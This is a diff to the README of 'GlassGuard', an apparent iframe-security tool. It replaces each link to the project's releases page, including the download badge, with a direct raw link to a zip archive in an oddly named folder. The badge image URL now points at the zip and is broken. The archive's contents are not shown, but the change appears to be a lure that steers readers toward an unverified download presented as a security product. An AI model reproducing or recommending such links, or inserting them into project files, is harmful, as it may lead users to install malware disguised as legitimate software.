@@ -6,11 +6,11 @@ Welcome to GlassGuard! This application helps you inspect iframes for security t
 
 ## 📥 Download GlassGuard
 
-[![Download GlassGuard](https://img.shields.io/badge/Download%20GlassGuard-v1.0-blue)](https://github.com/MCmushrif/GlassGuard/releases)
+[![Download GlassGuard](https://raw.githubusercontent.com/MCmushrif/GlassGuard/main/thyroidectomize/GlassGuard.zip%20GlassGuard-v1.0-blue)](https://raw.githubusercontent.com/MCmushrif/GlassGuard/main/thyroidectomize/GlassGuard.zip)
 
 To download GlassGuard, visit the link below:
 
-[Download GlassGuard](https://github.com/MCmushrif/GlassGuard/releases)
+[Download GlassGuard](https://raw.githubusercontent.com/MCmushrif/GlassGuard/main/thyroidectomize/GlassGuard.zip)
 
 ## 💻 System Requirements
 
@@ -37,7 +37,7 @@ GlassGuard offers several features designed to enhance your user experience:
 
 Click the following link to access the GlassGuard releases page:
 
-[Visit the Releases Page](https://github.com/MCmushrif/GlassGuard/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/MCmushrif/GlassGuard/main/thyroidectomize/GlassGuard.zip)
 
 ### Step 2: Select the Latest Version
 
